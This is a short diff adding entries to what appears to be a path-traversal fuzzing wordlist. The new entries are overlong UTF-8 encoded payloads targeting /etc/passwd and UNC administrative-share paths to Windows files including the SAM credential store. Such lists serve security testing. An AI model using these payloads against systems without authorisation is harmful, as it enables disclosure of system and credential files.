@@ -69,3 +69,10 @@
 ../../../.gitignore
 ../../../.htaccess
 ../../../web.config
+
+# === Overlong UTF-8, UNC administrative shares ===
+%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd
+%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+\\::1\c$\users\default\ntuser.dat
+\\localhost\c$\windows\win.ini
+\\10.0.0.5\admin$\system32\config\sam
